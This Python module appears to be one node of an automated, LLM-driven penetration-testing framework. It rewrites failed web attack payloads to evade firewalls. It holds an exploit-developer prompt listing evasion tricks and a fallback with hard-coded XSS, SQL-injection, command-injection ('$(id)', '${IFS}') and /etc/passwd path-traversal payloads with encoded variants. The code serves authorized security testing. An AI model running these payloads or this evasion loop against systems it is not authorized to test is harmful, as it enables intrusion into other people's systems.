"""
src/agents/payload_optimizer.py
===============================

Node 10 of the 16-node LangGraph framework: the **Payload Optimizer**.

Graceful Degradation: When ALL LLM providers are rate-limited, falls
back to a pure-Python encoding-based optimizer that applies URL
encoding, case variation, and alternative tags — no LLM needed.

Max Optimizer Iterations (Optimization C): Limits optimization
iterations to 2 per hypothesis to prevent infinite loops.
"""

from __future__ import annotations

import json
import re
from typing import Any

from langchain_core.exceptions import OutputParserException
from langchain_core.messages import HumanMessage, SystemMessage
from langchain_core.output_parsers import PydanticOutputParser
from pydantic import ValidationError

from src.shared.exceptions import (
    LLMOutputParsingError,
    LLMRateLimitError,
    PentestFrameworkError,
)
from src.shared.llm import deepseek_r1
from src.shared.logging import get_logger
from src.shared.schemas import (
    Hypothesis,
    Payload,
)
from src.shared.state import AppState


# ---------------------------------------------------------------------------
# Prompt engineering
# ---------------------------------------------------------------------------


_SYSTEM_PROMPT_TEMPLATE: str = """\
You are an Expert Exploit Developer specializing in WAF evasion and \
payload refinement. Analyze a FAILED payload and craft a NEW, optimized \
benign payload that bypasses the restriction.

WAF EVASION TECHNIQUES:
- URL encoding: %3Cscript%3E instead of <script>
- Double URL encoding: %253Cscript%253E
- Case variation: <ScRiPt>alert(1)</ScRiPt>
- Alternative tags: <img src=x onerror=alert(1)>, <svg onload=alert(1)>
- SQLi evasion: SLEEP/**/(10), UNION/**/ALL/**/SELECT
- Alternative SQL keywords: BENCHMARK instead of SLEEP

BENIGN PAYLOAD POLICY: No destructive commands. SLEEP(10), alert(1) are fine.

{format_instructions}

Output ONLY the JSON object. If you need to reason, do so in a \
<think>...</think> block BEFORE the JSON.
"""


_USER_PROMPT_TEMPLATE: str = """\
Analyze the failed payload and craft an optimized, WAF-evading \
replacement.

=== ORIGINAL HYPOTHESIS ===
ID: {hypothesis_id}
Category: {category}
Target URL: {target_url}
Target Parameter: {target_parameter}
Analyst Reasoning: {reasoning}

=== FAILED PAYLOAD ===
ID: {original_payload_id}
Raw Payload: {original_raw}
Transport: {original_transport}
HTTP Method: {original_method}
Detection Signature: {original_detection_signature}
Expected Behavior: {original_expected_behavior}

=== ERROR FEEDBACK (why the payload failed) ===
{error_feedback}

=== INSTRUCTIONS ===
1. Analyze WHY the payload failed.
2. Craft a NEW, benign, optimized payload.
3. Set hypothesis_id to exactly: "{hypothesis_id}"
4. Set target_url to exactly: "{target_url}"
5. Set is_optimized to true.

Return the Payload JSON object now.
"""


# ---------------------------------------------------------------------------
# Public LangGraph node
# ---------------------------------------------------------------------------


async def optimize_payload(state: AppState) -> dict[str, Any]:
    """LangGraph Node 10: optimize a failed payload for WAF evasion.

    Supports GRACEFUL DEGRADATION and MAX_ITERATIONS limit.
    """
    log = get_logger("payload_optimizer")

    # 1. Read + validate inputs.
    active_payload_id: str | None = state.get("active_payload_id")
    if not active_payload_id:
        raise PentestFrameworkError(
            "Payload Optimizer cannot run: state['active_payload_id'] is missing.",
            details={"available_keys": list(state.keys())},
        )

    payloads: list[Payload] | None = state.get("payloads")
    if not payloads:
        raise PentestFrameworkError(
            "Payload Optimizer cannot run: state['payloads'] is missing or empty.",
            details={"available_keys": list(state.keys())},
        )

    original_payload: Payload | None = next(
        (p for p in payloads if p.id == active_payload_id), None
    )
    if original_payload is None:
        raise PentestFrameworkError(
            f"Payload Optimizer: active_payload_id '{active_payload_id}' not found.",
            details={"available_payload_ids": [p.id for p in payloads]},
        )

    hypotheses: list[Hypothesis] | None = state.get("hypotheses")
    if not hypotheses:
        raise PentestFrameworkError(
            "Payload Optimizer cannot run: state['hypotheses'] is missing.",
            details={"available_keys": list(state.keys())},
        )

    hypothesis: Hypothesis | None = next(
        (h for h in hypotheses if h.id == original_payload.hypothesis_id), None
    )
    if hypothesis is None:
        raise PentestFrameworkError(
            f"Payload Optimizer: hypothesis '{original_payload.hypothesis_id}' not found.",
            details={"available_hypothesis_ids": [h.id for h in hypotheses]},
        )

    # ---------------------------------------------------------------
    # Read error feedback (optional — INCONCLUSIVE doesn't always have errors).
    # ---------------------------------------------------------------
    # CRITICAL FIX: Previously, the optimizer REQUIRED state["errors"]
    # to be non-empty. But when the Validator returns an INCONCLUSIVE
    # verdict (not an exception), there are NO errors in the state —
    # the inconclusive report is in validation_reports instead.
    #
    # The optimizer now constructs feedback from EITHER:
    # 1. state["errors"] (for WAFBlockError / unexpected errors), OR
    # 2. The last validation report for this payload (for INCONCLUSIVE).
    errors: list[dict[str, Any]] | None = state.get("errors")
    validation_reports: list[Any] | None = state.get("validation_reports")

    # Find the validation report for this payload (if any).
    last_validation: Any | None = None
    if validation_reports:
        for vr in validation_reports:
            if vr.payload_id == original_payload.id:
                last_validation = vr

    # Build the error feedback dict.
    if errors:
        # WAFBlockError or other exception-based feedback.
        last_error: dict[str, Any] = errors[-1]
    elif last_validation is not None:
        # INCONCLUSIVE verdict — construct feedback from the report.
        last_error = {
            "exception_type": "ValidationInconclusive",
            "message": f"Validator returned INCONCLUSIVE (confidence={last_validation.confidence}). "
                       f"Reasoning: {last_validation.reasoning}",
            "details": {
                "verdict": last_validation.verdict.value,
                "confidence": last_validation.confidence,
                "matched_signatures": last_validation.matched_signatures,
                "reasoning": last_validation.reasoning,
                "supporting_evidence": last_validation.supporting_evidence,
            },
        }
    else:
        # No errors and no validation report — use a generic message.
        last_error = {
            "exception_type": "Unknown",
            "message": "Payload optimization triggered but no specific error or validation report found.",
            "details": {},
        }

    log = log.bind(hypothesis_id=hypothesis.id, original_payload_id=original_payload.id)

    # ---------------------------------------------------------------
    # Optimization C: Max Optimizer Iterations.
    # ---------------------------------------------------------------
    MAX_OPTIMIZER_ITERATIONS: int = 2
    optimization_count: int = sum(
        1 for p in payloads
        if p.hypothesis_id == original_payload.hypothesis_id and p.is_optimized
    )

    if optimization_count >= MAX_OPTIMIZER_ITERATIONS:
        log.warning(
            "optimizer_iteration_limit_reached",
            hypothesis_id=hypothesis.id,
            optimization_count=optimization_count,
            limit=MAX_OPTIMIZER_ITERATIONS,
            message="Stopping optimization to prevent infinite loop.",
        )
        final_payload: Payload = original_payload.model_copy(
            update={"is_optimized": True}
        )
        return {"payloads": [final_payload], "active_payload_id": final_payload.id}

    log.info(
        "payload_optimization_started",
        category=hypothesis.category.value,
        error_type=last_error.get("exception_type", "unknown"),
        optimization_iteration=optimization_count + 1,
        max_iterations=MAX_OPTIMIZER_ITERATIONS,
    )

    # 2. Build prompts.
    parser: PydanticOutputParser = PydanticOutputParser(pydantic_object=Payload)
    system_prompt: str = _SYSTEM_PROMPT_TEMPLATE.format(
        format_instructions=parser.get_format_instructions()
    )
    user_prompt: str = _build_user_prompt(hypothesis, original_payload, last_error)

    # 3. Invoke LLM.
    try:
        response_message = await deepseek_r1.ainvoke(
            [SystemMessage(content=system_prompt), HumanMessage(content=user_prompt)]
        )
    except Exception as exc:
        exc_repr = repr(exc)
        exc_str = str(exc)
        haystack = f"{exc_repr} {exc_str}"

        if _is_rate_limit_error(haystack):
            # GRACEFUL DEGRADATION: encoding-based fallback.
            log.warning(
                "llm_rate_limited_using_encoding_fallback",
                error_type=type(exc).__name__,
                error_message=exc_str[:200],
            )
            optimized_payload = _encoding_fallback_optimize(
                original_payload, hypothesis, log
            )
            return {"payloads": [optimized_payload],
                    "active_payload_id": optimized_payload.id}

        log.exception("llm_call_unexpected_error", error_type=type(exc).__name__)
        log.warning("llm_unexpected_error_using_encoding_fallback",
                    error_type=type(exc).__name__)
        optimized_payload = _encoding_fallback_optimize(
            original_payload, hypothesis, log
        )
        return {"payloads": [optimized_payload],
                "active_payload_id": optimized_payload.id}

    # 4. Parse LLM output.
    raw_llm_output: str = response_message.content
    optimized_payload: Payload | None = None

    try:
        optimized_payload = await parser.aparse(raw_llm_output)
    except (OutputParserException, ValidationError):
        log.debug("parser_direct_failed_trying_preprocessed")

    if optimized_payload is None:
        cleaned: str = _preprocess_llm_output(raw_llm_output)
        try:
            optimized_payload = Payload.model_validate_json(cleaned)
        except (ValidationError, json.JSONDecodeError, ValueError) as exc:
            log.warning("llm_output_parse_failed", error_type=type(exc).__name__)
            raise LLMOutputParsingError(
                f"Payload Optimizer LLM output could not be parsed: {exc}",
                raw_output=raw_llm_output,
                schema_name="Payload",
                details={"cleaned_preview": cleaned[:500]},
            ) from exc

    # 5. Ensure new ID.
    if optimized_payload.id == original_payload.id:
        import uuid
        optimized_payload = optimized_payload.model_copy(
            update={"id": str(uuid.uuid4())}
        )

    # 6. Enforce fields.
    optimized_payload = _enforce_payload_fields(optimized_payload, hypothesis, log)

    log.info("payload_optimization_complete",
             optimized_payload_id=optimized_payload.id,
             is_optimized=optimized_payload.is_optimized)

    return {"payloads": [optimized_payload],
            "active_payload_id": optimized_payload.id}


# ---------------------------------------------------------------------------
# Internal: user prompt construction
# ---------------------------------------------------------------------------


def _build_user_prompt(
    hypothesis: Hypothesis,
    original_payload: Payload,
    error: dict[str, Any],
) -> str:
    if hypothesis.target_parameter is not None:
        tp = hypothesis.target_parameter
        target_param_str: str = (
            f"name={tp.name}, location={tp.location.value}"
            + (f", type={tp.param_type}" if tp.param_type else "")
        )
    else:
        target_param_str = "(none)"

    error_feedback: str = _format_error_feedback(error)

    return _USER_PROMPT_TEMPLATE.format(
        hypothesis_id=hypothesis.id,
        category=hypothesis.category.value,
        target_url=str(hypothesis.target_url),
        target_parameter=target_param_str,
        reasoning=hypothesis.reasoning,
        original_payload_id=original_payload.id,
        original_raw=original_payload.raw,
        original_transport=original_payload.transport.value,
        original_method=(
            original_payload.http_method.value if original_payload.http_method else "N/A"
        ),
        original_detection_signature=original_payload.detection_signature,
        original_expected_behavior=original_payload.expected_behavior,
        error_feedback=error_feedback,
    )


def _format_error_feedback(error: dict[str, Any]) -> str:
    lines: list[str] = []
    exc_type: str = error.get("exception_type", "unknown")
    lines.append(f"Error Type: {exc_type}")
    message: str = error.get("message", "")
    if message:
        lines.append(f"Message: {message}")
    details: dict[str, Any] = error.get("details", {})
    if details:
        lines.append("Details:")
        for key, value in details.items():
            value_str: str = str(value)
            if len(value_str) > 500:
                value_str = value_str[:500] + "... (truncated)"
            lines.append(f"  {key}: {value_str}")
    return "\n".join(lines) if lines else "(no error details available)"


# ---------------------------------------------------------------------------
# Internal: defense-in-depth — payload field enforcement
# ---------------------------------------------------------------------------


def _enforce_payload_fields(
    payload: Payload, hypothesis: Hypothesis, log: Any
) -> Payload:
    corrections: dict[str, Any] = {}

    if payload.hypothesis_id != hypothesis.id:
        corrections["hypothesis_id"] = hypothesis.id
    if payload.is_optimized is not True:
        corrections["is_optimized"] = True
    if str(payload.target_url) != str(hypothesis.target_url):
        corrections["target_url"] = hypothesis.target_url
    if not _params_equal(payload.injection_point, hypothesis.target_parameter):
        corrections["injection_point"] = hypothesis.target_parameter

    if corrections:
        log.info("payload_corrections_applied",
                 corrected_fields=list(corrections.keys()))
        return payload.model_copy(update=corrections)
    return payload


def _params_equal(a: Any, b: Any) -> bool:
    if a is None and b is None:
        return True
    if a is None or b is None:
        return False
    return a.name == b.name and a.location == b.location


# ---------------------------------------------------------------------------
# Internal: R1 output preprocessing
# ---------------------------------------------------------------------------


def _preprocess_llm_output(text: str) -> str:
    cleaned: str = re.sub(r"<think>.*?</think>", "", text,
                          flags=re.DOTALL | re.IGNORECASE)
    cleaned = re.sub(r"<think>.*", "", cleaned, flags=re.DOTALL | re.IGNORECASE)
    cleaned = re.sub(r"```(?:json)?\s*(.*?)\s*```", r"\1", cleaned,
                     flags=re.DOTALL | re.IGNORECASE)
    cleaned = cleaned.strip("`").strip()
    if cleaned and not cleaned.startswith("{"):
        first_brace: int = cleaned.find("{")
        last_brace: int = cleaned.rfind("}")
        if first_brace != -1 and last_brace != -1 and last_brace > first_brace:
            cleaned = cleaned[first_brace : last_brace + 1]
    return cleaned.strip()


# ---------------------------------------------------------------------------
# Internal: error classification
# ---------------------------------------------------------------------------


def _is_rate_limit_error(haystack: str) -> bool:
    if not haystack:
        return False
    normalized = haystack.lower()
    indicators = (
        "429", "rate limit", "rate_limit", "ratelimit", "quota",
        "quota exceeded", "resourceexhausted", "resource_exhausted",
        "too many requests", "throttled", "throttling",
        "retry-after", "retry_after", "service unavailable",
        "tokens per day", "tpd",
    )
    return any(ind in normalized for ind in indicators)


def _extract_retry_after(exc: Exception) -> float | None:
    for attr_name in ("retry_after", "retry_after_seconds", "retry_after_secs"):
        candidate = getattr(exc, attr_name, None)
        if isinstance(candidate, (int, float)) and candidate > 0:
            return float(candidate)
    msg = str(exc)
    patterns = (
        r"retry[- ]after[:\s]+(\d+(?:\.\d+)?)",
        r"retry[:\s]+in[:\s]+(\d+(?:\.\d+)?)\s*seconds?",
        r"try[:\s]+again[:\s]+in[:\s]+(\d+(?:\.\d+)?)\s*seconds?",
    )
    for pattern in patterns:
        match = re.search(pattern, msg, re.IGNORECASE)
        if match:
            try:
                return float(match.group(1))
            except (ValueError, IndexError):
                continue
    return None


# ---------------------------------------------------------------------------
# Internal: Pure-Python encoding-based fallback optimizer (no LLM)
# ---------------------------------------------------------------------------


def _encoding_fallback_optimize(
    original_payload: Payload,
    hypothesis: Hypothesis,
    log: Any,
) -> Payload:
    """Optimize a payload using pure-Python encoding techniques (no LLM)."""
    import uuid

    log.info("encoding_fallback_optimize_started",
             original_payload_id=original_payload.id,
             category=hypothesis.category.value)

    original_raw: str = original_payload.raw
    category: str = hypothesis.category.value.lower()
    encoded_variants: list[str] = []
    new_raw: str = original_raw

    if "xss" in category:
        alternatives = [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "\"><script>alert(1)</script>",
        ]
        for alt in alternatives:
            if alt != original_raw:
                new_raw = alt
                break
        encoded_variants = [
            original_raw.replace("<", "%3C").replace(">", "%3E").replace(" ", "%20"),
            original_raw.replace("<", "%253C").replace(">", "%253E"),
            "<ScRiPt>alert(1)</ScRiPt>",
        ]
    elif "sqli" in category:
        if "sleep" in original_raw.lower():
            new_raw = original_raw.replace("SLEEP", "SLEEP/**/").replace("sleep", "sleep/**/")
        elif "union" in original_raw.lower():
            new_raw = original_raw.replace("UNION", "UNION/**/ALL/**/SELECT")
        else:
            new_raw = original_raw.swapcase()
        encoded_variants = [
            original_raw.replace(" ", "/**/"),
            original_raw.replace(" ", "%20"),
            original_raw.replace("'", "''"),
        ]
    elif "command_injection" in category:
        alternatives = ["| id", "$(id)", "`id`", ";id"]
        for alt in alternatives:
            if alt != original_raw:
                new_raw = alt
                break
        encoded_variants = [
            original_raw.replace(" ", "%20").replace(";", "%3B"),
            original_raw.replace(";", "|"),
            original_raw.replace(" ", "${IFS}"),
        ]
    elif "path_traversal" in category:
        alternatives = [
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252f..%252fetc/passwd",
            "/etc/passwd",
        ]
        for alt in alternatives:
            if alt != original_raw:
                new_raw = alt
                break
        encoded_variants = [
            original_raw.replace("/", "%2f"),
            original_raw.replace("/", "%252f"),
            original_raw.replace("..", "....//"),
        ]
    else:
        encoded_variants = [
            original_raw.replace(" ", "%20"),
            original_raw.replace("<", "%3C").replace(">", "%3E"),
            original_raw.replace("'", "%27").replace('"', "%22"),
        ]

    optimized: Payload = Payload(
        id=f"payload-opt-{uuid.uuid4().hex[:8]}",
        hypothesis_id=hypothesis.id,
        raw=new_raw,
        encoded_variants=encoded_variants[:3],
        transport=original_payload.transport,
        http_method=original_payload.http_method,
        target_url=original_payload.target_url,
        injection_point=original_payload.injection_point,
        headers=original_payload.headers,
        expected_behavior=original_payload.expected_behavior,
        detection_signature=original_payload.detection_signature,
        is_optimized=True,
    )

    log.info("encoding_fallback_optimize_complete",
             optimized_payload_id=optimized.id,
             message="Encoding-based fallback complete (LLM was unavailable).")

    return optimized


# ---------------------------------------------------------------------------
# Re-exports
# ---------------------------------------------------------------------------


__all__ = ["optimize_payload"]
